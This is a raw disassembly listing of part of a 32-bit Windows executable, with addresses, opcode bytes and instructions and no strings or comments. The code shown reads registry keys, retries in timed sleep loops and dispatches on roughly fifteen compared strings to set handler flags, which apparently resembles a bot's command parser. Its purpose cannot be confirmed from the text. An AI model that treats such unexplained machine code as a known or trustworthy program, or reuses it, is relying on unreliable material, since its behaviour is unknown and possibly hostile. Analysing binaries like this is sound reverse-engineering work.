  40aaaa:	8d 7d 0c             	lea    0xc(%ebp),%edi
  40aaad:	e8 b7 c3 ff ff       	call   0x406e69
  40aab2:	8b f8                	mov    %eax,%edi
  40aab4:	83 c4 10             	add    $0x10,%esp
  40aab7:	83 ff 01             	cmp    $0x1,%edi
  40aaba:	74 0b                	je     0x40aac7
  40aabc:	68 10 27 00 00       	push   $0x2710
  40aac1:	ff 15 70 e0 40 00    	call   *0x40e070
  40aac7:	43                   	inc    %ebx
  40aac8:	3b fe                	cmp    %esi,%edi
  40aaca:	74 05                	je     0x40aad1
  40aacc:	83 ff 02             	cmp    $0x2,%edi
  40aacf:	75 14                	jne    0x40aae5
  40aad1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40aad4:	53                   	push   %ebx
  40aad5:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  40aadb:	e8 64 fc ff ff       	call   0x40a744
  40aae0:	85 c0                	test   %eax,%eax
  40aae2:	59                   	pop    %ecx
  40aae3:	75 af                	jne    0x40aa94
  40aae5:	ff 75 0c             	push   0xc(%ebp)
  40aae8:	56                   	push   %esi
  40aae9:	ff 15 d0 e0 40 00    	call   *0x40e0d0
  40aaef:	50                   	push   %eax
  40aaf0:	ff 15 a8 e0 40 00    	call   *0x40e0a8
  40aaf6:	8b c7                	mov    %edi,%eax
  40aaf8:	5f                   	pop    %edi
  40aaf9:	5e                   	pop    %esi
  40aafa:	5b                   	pop    %ebx
  40aafb:	c9                   	leave
  40aafc:	c3                   	ret
  40aafd:	55                   	push   %ebp
  40aafe:	8b ec                	mov    %esp,%ebp
  40ab00:	b8 40 18 00 00       	mov    $0x1840,%eax
  40ab05:	e8 a6 2a 00 00       	call   0x40d5b0
  40ab0a:	ff 15 f8 e0 40 00    	call   *0x40e0f8
  40ab10:	68 a8 f2 40 00       	push   $0x40f2a8
  40ab15:	e8 79 a9 ff ff       	call   0x405493
  40ab1a:	85 c0                	test   %eax,%eax
  40ab1c:	59                   	pop    %ecx
  40ab1d:	74 05                	je     0x40ab24
  40ab1f:	33 c0                	xor    %eax,%eax
  40ab21:	40                   	inc    %eax
  40ab22:	c9                   	leave
  40ab23:	c3                   	ret
  40ab24:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40ab2a:	50                   	push   %eax
  40ab2b:	e8 f0 00 00 00       	call   0x40ac20
  40ab30:	85 c0                	test   %eax,%eax
  40ab32:	59                   	pop    %ecx
  40ab33:	74 43                	je     0x40ab78
  40ab35:	56                   	push   %esi
  40ab36:	68 20 08 00 00       	push   $0x820
  40ab3b:	8d 85 c0 e7 ff ff    	lea    -0x1840(%ebp),%eax
  40ab41:	50                   	push   %eax
  40ab42:	6a 00                	push   $0x0
  40ab44:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  40ab4a:	8b 35 44 e1 40 00    	mov    0x40e144,%esi
  40ab50:	8d 85 c0 e7 ff ff    	lea    -0x1840(%ebp),%eax
  40ab56:	50                   	push   %eax
  40ab57:	ff d6                	call   *%esi
  40ab59:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40ab5f:	50                   	push   %eax
  40ab60:	ff d6                	call   *%esi
  40ab62:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40ab68:	8d 95 c0 e7 ff ff    	lea    -0x1840(%ebp),%edx
  40ab6e:	e8 f4 a8 ff ff       	call   0x405467
  40ab73:	85 c0                	test   %eax,%eax
  40ab75:	5e                   	pop    %esi
  40ab76:	74 a7                	je     0x40ab1f
  40ab78:	33 c0                	xor    %eax,%eax
  40ab7a:	c9                   	leave
  40ab7b:	c3                   	ret
  40ab7c:	55                   	push   %ebp
  40ab7d:	8b ec                	mov    %esp,%ebp
  40ab7f:	81 ec 00 08 00 00    	sub    $0x800,%esp
  40ab85:	68 00 04 00 00       	push   $0x400
  40ab8a:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40ab90:	50                   	push   %eax
  40ab91:	6a 00                	push   $0x0
  40ab93:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  40ab99:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40ab9f:	50                   	push   %eax
  40aba0:	ff 15 44 e1 40 00    	call   *0x40e144
  40aba6:	68 f2 f2 40 00       	push   $0x40f2f2
  40abab:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  40abb1:	e8 dd a8 ff ff       	call   0x405493
  40abb6:	85 c0                	test   %eax,%eax
  40abb8:	59                   	pop    %ecx
  40abb9:	74 05                	je     0x40abc0
  40abbb:	33 c0                	xor    %eax,%eax
  40abbd:	40                   	inc    %eax
  40abbe:	c9                   	leave
  40abbf:	c3                   	ret
  40abc0:	ff 15 f8 e0 40 00    	call   *0x40e0f8
  40abc6:	68 d4 f2 40 00       	push   $0x40f2d4
  40abcb:	e8 c3 a8 ff ff       	call   0x405493
  40abd0:	f7 d8                	neg    %eax
  40abd2:	1b c0                	sbb    %eax,%eax
  40abd4:	59                   	pop    %ecx
  40abd5:	f7 d8                	neg    %eax
  40abd7:	c9                   	leave
  40abd8:	c3                   	ret
  40abd9:	55                   	push   %ebp
  40abda:	8b ec                	mov    %esp,%ebp
  40abdc:	83 e4 f8             	and    $0xfffffff8,%esp
  40abdf:	8d 84 24 00 f8 ff ff 	lea    -0x800(%esp),%eax
  40abe6:	81 ec 50 0a 00 00    	sub    $0xa50,%esp
  40abec:	50                   	push   %eax
  40abed:	e8 2e 00 00 00       	call   0x40ac20
  40abf2:	85 c0                	test   %eax,%eax
  40abf4:	59                   	pop    %ecx
  40abf5:	74 23                	je     0x40ac1a
  40abf7:	8d 04 24             	lea    (%esp),%eax
  40abfa:	50                   	push   %eax
  40abfb:	8d 84 24 54 02 00 00 	lea    0x254(%esp),%eax
  40ac02:	50                   	push   %eax
  40ac03:	ff 15 84 e0 40 00    	call   *0x40e084
  40ac09:	83 f8 ff             	cmp    $0xffffffff,%eax
  40ac0c:	74 0c                	je     0x40ac1a
  40ac0e:	50                   	push   %eax
  40ac0f:	ff 15 e8 e0 40 00    	call   *0x40e0e8
  40ac15:	33 c0                	xor    %eax,%eax
  40ac17:	40                   	inc    %eax
  40ac18:	eb 02                	jmp    0x40ac1c
  40ac1a:	33 c0                	xor    %eax,%eax
  40ac1c:	8b e5                	mov    %ebp,%esp
  40ac1e:	5d                   	pop    %ebp
  40ac1f:	c3                   	ret
  40ac20:	55                   	push   %ebp
  40ac21:	8b ec                	mov    %esp,%ebp
  40ac23:	51                   	push   %ecx
  40ac24:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40ac28:	53                   	push   %ebx
  40ac29:	56                   	push   %esi
  40ac2a:	57                   	push   %edi
  40ac2b:	8b 3d 00 e0 40 00    	mov    0x40e000,%edi
  40ac31:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40ac34:	50                   	push   %eax
  40ac35:	6a 01                	push   $0x1
  40ac37:	6a 00                	push   $0x0
  40ac39:	bb d8 f1 40 00       	mov    $0x40f1d8,%ebx
  40ac3e:	53                   	push   %ebx
  40ac3f:	68 01 00 00 80       	push   $0x80000001
  40ac44:	ff d7                	call   *%edi
  40ac46:	85 c0                	test   %eax,%eax
  40ac48:	75 16                	jne    0x40ac60
  40ac4a:	ff 75 08             	push   0x8(%ebp)
  40ac4d:	8d 75 fc             	lea    -0x4(%ebp),%esi
  40ac50:	68 14 f4 40 00       	push   $0x40f414
  40ac55:	e8 66 bd ff ff       	call   0x4069c0
  40ac5a:	85 c0                	test   %eax,%eax
  40ac5c:	59                   	pop    %ecx
  40ac5d:	59                   	pop    %ecx
  40ac5e:	75 2e                	jne    0x40ac8e
  40ac60:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40ac64:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40ac67:	50                   	push   %eax
  40ac68:	6a 01                	push   $0x1
  40ac6a:	6a 00                	push   $0x0
  40ac6c:	53                   	push   %ebx
  40ac6d:	68 02 00 00 80       	push   $0x80000002
  40ac72:	ff d7                	call   *%edi
  40ac74:	85 c0                	test   %eax,%eax
  40ac76:	74 04                	je     0x40ac7c
  40ac78:	33 c0                	xor    %eax,%eax
  40ac7a:	eb 12                	jmp    0x40ac8e
  40ac7c:	ff 75 08             	push   0x8(%ebp)
  40ac7f:	8d 75 fc             	lea    -0x4(%ebp),%esi
  40ac82:	68 14 f4 40 00       	push   $0x40f414
  40ac87:	e8 34 bd ff ff       	call   0x4069c0
  40ac8c:	59                   	pop    %ecx
  40ac8d:	59                   	pop    %ecx
  40ac8e:	5f                   	pop    %edi
  40ac8f:	5e                   	pop    %esi
  40ac90:	5b                   	pop    %ebx
  40ac91:	c9                   	leave
  40ac92:	c3                   	ret
  40ac93:	55                   	push   %ebp
  40ac94:	8b ec                	mov    %esp,%ebp
  40ac96:	81 ec 50 04 00 00    	sub    $0x450,%esp
  40ac9c:	53                   	push   %ebx
  40ac9d:	56                   	push   %esi
  40ac9e:	57                   	push   %edi
  40ac9f:	e8 70 c0 ff ff       	call   0x406d14
  40aca4:	33 db                	xor    %ebx,%ebx
  40aca6:	43                   	inc    %ebx
  40aca7:	eb 10                	jmp    0x40acb9
  40aca9:	68 10 27 00 00       	push   $0x2710
  40acae:	ff 15 70 e0 40 00    	call   *0x40e070
  40acb4:	e8 5b c0 ff ff       	call   0x406d14
  40acb9:	3b c3                	cmp    %ebx,%eax
  40acbb:	75 ec                	jne    0x40aca9
  40acbd:	33 ff                	xor    %edi,%edi
  40acbf:	53                   	push   %ebx
  40acc0:	be 68 4f 41 00       	mov    $0x414f68,%esi
  40acc5:	56                   	push   %esi
  40acc6:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40acc9:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40accc:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40accf:	e8 f7 cb ff ff       	call   0x4078cb
  40acd4:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40acda:	50                   	push   %eax
  40acdb:	ba 14 f3 40 00       	mov    $0x40f314,%edx
  40ace0:	e8 2c a8 ff ff       	call   0x405511
  40ace5:	83 c4 0c             	add    $0xc,%esp
  40ace8:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40aceb:	b9 c1 02 00 00       	mov    $0x2c1,%ecx
  40acf0:	e8 04 aa ff ff       	call   0x4056f9
  40acf5:	50                   	push   %eax
  40acf6:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40acfc:	50                   	push   %eax
  40acfd:	e8 27 a8 ff ff       	call   0x405529
  40ad02:	59                   	pop    %ecx
  40ad03:	59                   	pop    %ecx
  40ad04:	e8 ac bf ff ff       	call   0x406cb5
  40ad09:	8b c8                	mov    %eax,%ecx
  40ad0b:	3b cf                	cmp    %edi,%ecx
  40ad0d:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40ad10:	75 0c                	jne    0x40ad1e
  40ad12:	66 c7 45 b4 30 00    	movw   $0x30,-0x4c(%ebp)
  40ad18:	66 89 7d b6          	mov    %di,-0x4a(%ebp)
  40ad1c:	eb 05                	jmp    0x40ad23
  40ad1e:	e8 d6 a9 ff ff       	call   0x4056f9
  40ad23:	50                   	push   %eax
  40ad24:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40ad2a:	50                   	push   %eax
  40ad2b:	e8 f9 a7 ff ff       	call   0x405529
  40ad30:	39 7d 08             	cmp    %edi,0x8(%ebp)
  40ad33:	59                   	pop    %ecx
  40ad34:	59                   	pop    %ecx
  40ad35:	74 10                	je     0x40ad47
  40ad37:	b9 14 f5 40 00       	mov    $0x40f514,%ecx
  40ad3c:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40ad42:	e8 a6 a7 ff ff       	call   0x4054ed
  40ad47:	e8 cc f9 ff ff       	call   0x40a718
  40ad4c:	89 45 08             	mov    %eax,0x8(%ebp)
  40ad4f:	eb 02                	jmp    0x40ad53
  40ad51:	33 ff                	xor    %edi,%edi
  40ad53:	ff 75 f8             	push   -0x8(%ebp)
  40ad56:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ad59:	8d 85 b4 fb ff ff    	lea    -0x44c(%ebp),%eax
  40ad5f:	e8 e0 f9 ff ff       	call   0x40a744
  40ad64:	85 c0                	test   %eax,%eax
  40ad66:	59                   	pop    %ecx
  40ad67:	75 13                	jne    0x40ad7c
  40ad69:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  40ad6c:	75 03                	jne    0x40ad71
  40ad6e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40ad71:	68 60 ea 00 00       	push   $0xea60
  40ad76:	ff 15 70 e0 40 00    	call   *0x40e070
  40ad7c:	ff 75 f4             	push   -0xc(%ebp)
  40ad7f:	8d 85 b4 fd ff ff    	lea    -0x24c(%ebp),%eax
  40ad85:	56                   	push   %esi
  40ad86:	50                   	push   %eax
  40ad87:	8d 85 b4 fb ff ff    	lea    -0x44c(%ebp),%eax
  40ad8d:	50                   	push   %eax
  40ad8e:	8d 7d f0             	lea    -0x10(%ebp),%edi
  40ad91:	e8 d3 c0 ff ff       	call   0x406e69
  40ad96:	8b f8                	mov    %eax,%edi
  40ad98:	83 c4 10             	add    $0x10,%esp
  40ad9b:	3b fb                	cmp    %ebx,%edi
  40ad9d:	74 0b                	je     0x40adaa
  40ad9f:	68 10 27 00 00       	push   $0x2710
  40ada4:	ff 15 70 e0 40 00    	call   *0x40e070
  40adaa:	ff 45 f8             	incl   -0x8(%ebp)
  40adad:	85 ff                	test   %edi,%edi
  40adaf:	74 05                	je     0x40adb6
  40adb1:	83 ff 02             	cmp    $0x2,%edi
  40adb4:	75 06                	jne    0x40adbc
  40adb6:	83 7d f8 64          	cmpl   $0x64,-0x8(%ebp)
  40adba:	7c 95                	jl     0x40ad51
  40adbc:	3b fb                	cmp    %ebx,%edi
  40adbe:	75 0a                	jne    0x40adca
  40adc0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40adc3:	e8 09 00 00 00       	call   0x40add1
  40adc8:	8b f8                	mov    %eax,%edi
  40adca:	8b c7                	mov    %edi,%eax
  40adcc:	5f                   	pop    %edi
  40adcd:	5e                   	pop    %esi
  40adce:	5b                   	pop    %ebx
  40adcf:	c9                   	leave
  40add0:	c3                   	ret
  40add1:	55                   	push   %ebp
  40add2:	8b ec                	mov    %esp,%ebp
  40add4:	83 ec 34             	sub    $0x34,%esp
  40add7:	56                   	push   %esi
  40add8:	57                   	push   %edi
  40add9:	6a 02                	push   $0x2
  40addb:	5f                   	pop    %edi
  40addc:	68 7c eb 40 00       	push   $0x40eb7c
  40ade1:	8b f0                	mov    %eax,%esi
  40ade3:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40ade6:	e8 a8 a6 ff ff       	call   0x405493
  40adeb:	3b c6                	cmp    %esi,%eax
  40aded:	59                   	pop    %ecx
  40adee:	74 07                	je     0x40adf7
  40adf0:	8b c7                	mov    %edi,%eax
  40adf2:	e9 28 02 00 00       	jmp    0x40b01f
  40adf7:	53                   	push   %ebx
  40adf8:	68 24 f5 40 00       	push   $0x40f524
  40adfd:	8b c6                	mov    %esi,%eax
  40adff:	e8 8f a6 ff ff       	call   0x405493
  40ae04:	8b f8                	mov    %eax,%edi
  40ae06:	8b c6                	mov    %esi,%eax
  40ae08:	c7 04 24 38 f5 40 00 	movl   $0x40f538,(%esp)
  40ae0f:	e8 7f a6 ff ff       	call   0x405493
  40ae14:	8b d8                	mov    %eax,%ebx
  40ae16:	8b c6                	mov    %esi,%eax
  40ae18:	c7 04 24 4c f5 40 00 	movl   $0x40f54c,(%esp)
  40ae1f:	e8 6f a6 ff ff       	call   0x405493
  40ae24:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40ae27:	8b c6                	mov    %esi,%eax
  40ae29:	c7 04 24 60 f5 40 00 	movl   $0x40f560,(%esp)
  40ae30:	e8 5e a6 ff ff       	call   0x405493
  40ae35:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40ae38:	8b c6                	mov    %esi,%eax
  40ae3a:	c7 04 24 74 f5 40 00 	movl   $0x40f574,(%esp)
  40ae41:	e8 4d a6 ff ff       	call   0x405493
  40ae46:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40ae49:	8b c6                	mov    %esi,%eax
  40ae4b:	c7 04 24 88 f5 40 00 	movl   $0x40f588,(%esp)
  40ae52:	e8 3c a6 ff ff       	call   0x405493
  40ae57:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40ae5a:	8b c6                	mov    %esi,%eax
  40ae5c:	c7 04 24 a0 f5 40 00 	movl   $0x40f5a0,(%esp)
  40ae63:	e8 2b a6 ff ff       	call   0x405493
  40ae68:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40ae6b:	8b c6                	mov    %esi,%eax
  40ae6d:	c7 04 24 b4 f5 40 00 	movl   $0x40f5b4,(%esp)
  40ae74:	e8 1a a6 ff ff       	call   0x405493
  40ae79:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40ae7c:	8b c6                	mov    %esi,%eax
  40ae7e:	c7 04 24 c8 f5 40 00 	movl   $0x40f5c8,(%esp)
  40ae85:	e8 09 a6 ff ff       	call   0x405493
  40ae8a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40ae8d:	8b c6                	mov    %esi,%eax
  40ae8f:	c7 04 24 d8 f5 40 00 	movl   $0x40f5d8,(%esp)
  40ae96:	e8 f8 a5 ff ff       	call   0x405493
  40ae9b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40ae9e:	8b c6                	mov    %esi,%eax
  40aea0:	c7 04 24 e8 f5 40 00 	movl   $0x40f5e8,(%esp)
  40aea7:	e8 e7 a5 ff ff       	call   0x405493
  40aeac:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40aeaf:	8b c6                	mov    %esi,%eax
  40aeb1:	c7 04 24 fc f5 40 00 	movl   $0x40f5fc,(%esp)
  40aeb8:	e8 d6 a5 ff ff       	call   0x405493
  40aebd:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40aec0:	8b c6                	mov    %esi,%eax
  40aec2:	c7 04 24 18 f6 40 00 	movl   $0x40f618,(%esp)
  40aec9:	e8 c5 a5 ff ff       	call   0x405493
  40aece:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40aed1:	8b c6                	mov    %esi,%eax
  40aed3:	c7 04 24 2c f6 40 00 	movl   $0x40f62c,(%esp)
  40aeda:	e8 b4 a5 ff ff       	call   0x405493
  40aedf:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40aee2:	8b c6                	mov    %esi,%eax
  40aee4:	c7 04 24 40 f6 40 00 	movl   $0x40f640,(%esp)
  40aeeb:	e8 a3 a5 ff ff       	call   0x405493
  40aef0:	85 c0                	test   %eax,%eax
  40aef2:	59                   	pop    %ecx
  40aef3:	74 07                	je     0x40aefc
  40aef5:	c7 45 fc 02 01 00 00 	movl   $0x102,-0x4(%ebp)
  40aefc:	68 54 f6 40 00       	push   $0x40f654
  40af01:	8b c6                	mov    %esi,%eax
  40af03:	e8 8b a5 ff ff       	call   0x405493
  40af08:	85 c0                	test   %eax,%eax
  40af0a:	59                   	pop    %ecx
  40af0b:	74 08                	je     0x40af15
  40af0d:	6a 04                	push   $0x4
  40af0f:	58                   	pop    %eax
  40af10:	e9 09 01 00 00       	jmp    0x40b01e
  40af15:	85 ff                	test   %edi,%edi
  40af17:	74 0a                	je     0x40af23
  40af19:	8b c7                	mov    %edi,%eax
  40af1b:	e8 99 aa ff ff       	call   0x4059b9
  40af20:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af23:	85 db                	test   %ebx,%ebx
  40af25:	74 0a                	je     0x40af31
  40af27:	8b c3                	mov    %ebx,%eax
  40af29:	e8 50 ad ff ff       	call   0x405c7e
  40af2e:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af31:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40af34:	85 c0                	test   %eax,%eax
  40af36:	74 08                	je     0x40af40
  40af38:	e8 1a b3 ff ff       	call   0x406257
  40af3d:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af40:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40af43:	85 c0                	test   %eax,%eax
  40af45:	74 08                	je     0x40af4f
  40af47:	e8 df b4 ff ff       	call   0x40642b
  40af4c:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af4f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40af52:	85 c0                	test   %eax,%eax
  40af54:	74 08                	je     0x40af5e
  40af56:	e8 4b b6 ff ff       	call   0x4065a6
  40af5b:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af5e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40af61:	85 c0                	test   %eax,%eax
  40af63:	74 08                	je     0x40af6d
  40af65:	e8 b1 b1 ff ff       	call   0x40611b
  40af6a:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af6d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40af70:	85 c0                	test   %eax,%eax
  40af72:	74 08                	je     0x40af7c
  40af74:	e8 a2 ab ff ff       	call   0x405b1b
  40af79:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af7c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40af7f:	85 c0                	test   %eax,%eax
  40af81:	74 08                	je     0x40af8b
  40af83:	e8 38 b0 ff ff       	call   0x405fc0
  40af88:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af8b:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40af8f:	74 0c                	je     0x40af9d
  40af91:	ff 75 f8             	push   -0x8(%ebp)
  40af94:	e8 1f b8 ff ff       	call   0x4067b8
  40af99:	09 45 fc             	or     %eax,-0x4(%ebp)
  40af9c:	59                   	pop    %ecx
  40af9d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40afa0:	85 c0                	test   %eax,%eax
  40afa2:	74 08                	je     0x40afac
  40afa4:	e8 90 b8 ff ff       	call   0x406839
  40afa9:	09 45 fc             	or     %eax,-0x4(%ebp)
  40afac:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40afaf:	85 c0                	test   %eax,%eax
  40afb1:	74 08                	je     0x40afbb
  40afb3:	e8 8d b9 ff ff       	call   0x406945
  40afb8:	09 45 fc             	or     %eax,-0x4(%ebp)
  40afbb:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40afbe:	85 c0                	test   %eax,%eax
  40afc0:	74 27                	je     0x40afe9
  40afc2:	68 34 50 41 00       	push   $0x415034
  40afc7:	6a 5e                	push   $0x5e
  40afc9:	68 88 2b 42 00       	push   $0x422b88
  40afce:	83 c0 18             	add    $0x18,%eax
  40afd1:	66 bf 27 00          	mov    $0x27,%di
  40afd5:	e8 91 a8 ff ff       	call   0x40586b
  40afda:	83 c4 0c             	add    $0xc,%esp
  40afdd:	f7 d8                	neg    %eax
  40afdf:	1b c0                	sbb    %eax,%eax
  40afe1:	25 00 00 02 00       	and    $0x20000,%eax
  40afe6:	09 45 fc             	or     %eax,-0x4(%ebp)
  40afe9:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  40afed:	74 1a                	je     0x40b009
  40afef:	68 ea 53 40 00       	push   $0x4053ea
  40aff4:	6a 0a                	push   $0xa
  40aff6:	bf 00 02 00 00       	mov    $0x200,%edi
  40affb:	57                   	push   %edi
  40affc:	33 f6                	xor    %esi,%esi
  40affe:	e8 7f b9 ff ff       	call   0x406982
  40b003:	83 c4 0c             	add    $0xc,%esp
  40b006:	09 7d fc             	or     %edi,-0x4(%ebp)
  40b009:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40b00d:	74 0c                	je     0x40b01b
  40b00f:	ff 75 f4             	push   -0xc(%ebp)
  40b012:	e8 60 a9 ff ff       	call   0x405977
  40b017:	09 45 fc             	or     %eax,-0x4(%ebp)
  40b01a:	59                   	pop    %ecx
  40b01b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40b01e:	5b                   	pop    %ebx
  40b01f:	5f                   	pop    %edi
  40b020:	5e                   	pop    %esi
  40b021:	c9                   	leave
  40b022:	c3                   	ret
  40b023:	55                   	push   %ebp
  40b024:	8b ec                	mov    %esp,%ebp
  40b026:	51                   	push   %ecx
  40b027:	8b 45 08             	mov    0x8(%ebp),%eax
  40b02a:	53                   	push   %ebx
  40b02b:	56                   	push   %esi
  40b02c:	8b 30                	mov    (%eax),%esi
  40b02e:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40b031:	69 f6 44 01 00 00    	imul   $0x144,%esi,%esi
  40b037:	57                   	push   %edi
  40b038:	33 ff                	xor    %edi,%edi
  40b03a:	83 c8 ff             	or     $0xffffffff,%eax
  40b03d:	39 be 10 a6 41 00    	cmp    %edi,0x41a610(%esi)
  40b043:	89 7d 08             	mov    %edi,0x8(%ebp)
  40b046:	76 44                	jbe    0x40b08c
  40b048:	8b 9e 10 a6 41 00    	mov    0x41a610(%esi),%ebx
  40b04e:	8d 8e d4 a4 41 00    	lea    0x41a4d4(%esi),%ecx
  40b054:	8b 11                	mov    (%ecx),%edx
  40b056:	39 55 08             	cmp    %edx,0x8(%ebp)
  40b059:	73 05                	jae    0x40b060
  40b05b:	89 55 08             	mov    %edx,0x8(%ebp)
  40b05e:	8b c7                	mov    %edi,%eax
  40b060:	47                   	inc    %edi
  40b061:	83 c1 10             	add    $0x10,%ecx
  40b064:	3b fb                	cmp    %ebx,%edi
  40b066:	72 ec                	jb     0x40b054
  40b068:	83 f8 ff             	cmp    $0xffffffff,%eax
  40b06b:	74 1f                	je     0x40b08c
  40b06d:	c1 e0 04             	shl    $0x4,%eax
  40b070:	03 c6                	add    %esi,%eax
  40b072:	33 ff                	xor    %edi,%edi
  40b074:	89 b8 d4 a4 41 00    	mov    %edi,0x41a4d4(%eax)
  40b07a:	8b 80 dc a4 41 00    	mov    0x41a4dc(%eax),%eax
  40b080:	3b c7                	cmp    %edi,%eax
  40b082:	74 08                	je     0x40b08c
  40b084:	ff 75 fc             	push   -0x4(%ebp)
  40b087:	ff d0                	call   *%eax
  40b089:	59                   	pop    %ecx
  40b08a:	eb ae                	jmp    0x40b03a
  40b08c:	5f                   	pop    %edi
  40b08d:	33 c0                	xor    %eax,%eax
  40b08f:	5e                   	pop    %esi
  40b090:	40                   	inc    %eax
  40b091:	5b                   	pop    %ebx
  40b092:	c9                   	leave
  40b093:	c2 04 00             	ret    $0x4
  40b096:	55                   	push   %ebp
  40b097:	8b ec                	mov    %esp,%ebp
  40b099:	b8 60 20 00 00       	mov    $0x2060,%eax
  40b09e:	e8 0d 25 00 00       	call   0x40d5b0
  40b0a3:	53                   	push   %ebx
  40b0a4:	56                   	push   %esi
  40b0a5:	8b 75 08             	mov    0x8(%ebp),%esi
  40b0a8:	83 fe 03             	cmp    $0x3,%esi
  40b0ab:	57                   	push   %edi
  40b0ac:	75 07                	jne    0x40b0b5
  40b0ae:	33 c0                	xor    %eax,%eax
  40b0b0:	e9 14 02 00 00       	jmp    0x40b2c9
  40b0b5:	f7 c6 00 00 02 00    	test   $0x20000,%esi
  40b0bb:	74 12                	je     0x40b0cf
  40b0bd:	8b 1d 34 50 41 00    	mov    0x415034,%ebx
  40b0c3:	bf 88 2b 42 00       	mov    $0x422b88,%edi
  40b0c8:	e8 c8 c8 ff ff       	call   0x407995
  40b0cd:	eb 07                	jmp    0x40b0d6
  40b0cf:	33 c0                	xor    %eax,%eax
  40b0d1:	e8 7b c8 ff ff       	call   0x407951
  40b0d6:	89 75 f4             	mov    %esi,-0xc(%ebp)
  40b0d9:	83 65 f4 08          	andl   $0x8,-0xc(%ebp)
  40b0dd:	6a 00                	push   $0x0
  40b0df:	5b                   	pop    %ebx
  40b0e0:	bf 40 08 42 00       	mov    $0x420840,%edi
  40b0e5:	74 79                	je     0x40b160
  40b0e7:	81 3d 60 50 41 00 c1 	cmpl   $0x2c1,0x415060
  40b0ee:	02 00 00 
  40b0f1:	7e 6d                	jle    0x40b160
  40b0f3:	39 1d a4 06 42 00    	cmp    %ebx,0x4206a4
  40b0f9:	75 65                	jne    0x40b160
  40b0fb:	be 00 10 00 00       	mov    $0x1000,%esi
  40b100:	56                   	push   %esi
  40b101:	57                   	push   %edi
  40b102:	53                   	push   %ebx
  40b103:	ff 15 b0 e0 40 00    	call   *0x40e0b0
  40b109:	85 c0                	test   %eax,%eax
  40b10b:	74 09                	je     0x40b116
  40b10d:	8b d7                	mov    %edi,%edx
  40b10f:	e8 e5 bb ff ff       	call   0x406cf9
  40b114:	eb 08                	jmp    0x40b11e
  40b116:	57                   	push   %edi
  40b117:	56                   	push   %esi
  40b118:	ff 15 d4 e0 40 00    	call   *0x40e0d4
  40b11e:	8d 85 a4 df ff ff    	lea    -0x205c(%ebp),%eax
  40b124:	50                   	push   %eax
  40b125:	8b d7                	mov    %edi,%edx
  40b127:	e8 e5 a3 ff ff       	call   0x405511
  40b12c:	59                   	pop    %ecx
  40b12d:	b9 f0 f2 40 00       	mov    $0x40f2f0,%ecx
  40b132:	8d 85 a4 df ff ff    	lea    -0x205c(%ebp),%eax
  40b138:	e8 b0 a3 ff ff       	call   0x4054ed
  40b13d:	53                   	push   %ebx
  40b13e:	53                   	push   %ebx
  40b13f:	6a 01                	push   $0x1
  40b141:	ff 35 38 08 42 00    	push   0x420838
  40b147:	53                   	push   %ebx
  40b148:	50                   	push   %eax
  40b149:	53                   	push   %ebx
  40b14a:	ff 35 d0 3d 42 00    	push   0x423dd0
  40b150:	e8 e7 73 ff ff       	call   0x40253c
  40b155:	83 c4 20             	add    $0x20,%esp
  40b158:	85 c0                	test   %eax,%eax
